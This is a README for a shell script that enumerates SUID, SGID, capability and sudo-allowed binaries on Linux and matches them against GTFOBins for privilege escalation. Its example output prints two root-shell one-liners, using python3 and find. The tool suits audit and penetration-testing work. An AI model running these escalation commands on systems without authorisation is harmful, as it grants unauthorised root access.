# GTFOBins Auto-Checker

Self-contained shell script that scans a Linux system for exploitable binaries — cross-referenced against all **435 GTFOBins** entries. No dependencies, no internet needed on target.

## Usage

```bash
chmod +x gtfo-check.sh
./gtfo-check.sh
```

## What it scans

| Check | Command | Description |
|-------|---------|-------------|
| SUID | `find / -perm -4000` | Binaries that run as owner (usually root) |
| SGID | `find / -perm -2000` | Binaries that run as group |
| Capabilities | `getcap -r /` | Binaries with Linux capabilities |
| Sudo | `sudo -n -l` | Sudo-allowed binaries (needs NOPASSWD or cached creds) |

## Output

For each exploitable binary found, it shows:
- Binary name and path
- Exploitable functions (shell, file-read, file-write, reverse-shell, etc.)
- The exact exploit command from GTFOBins

## Example

```
══════════════════════════════════════════
  SUID Binaries (-perm -4000)
══════════════════════════════════════════
  ✓ python3 (shell,file-read,file-write)
    Path: /usr/bin/python3
    Exploit:
      python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

  ✓ find (shell,file-read,file-write)
    Path: /usr/bin/find
    Exploit:
      find . -exec /bin/sh -p \; -quit

══════════════════════════════════════════
  2 exploitable binary/binaries found!
  Details: https://gtfobins.github.io/
══════════════════════════════════════════
```

## Data source

All 435 entries from [GTFOBins](https://gtfobins.github.io/) are embedded in the script — no network access or external files required.
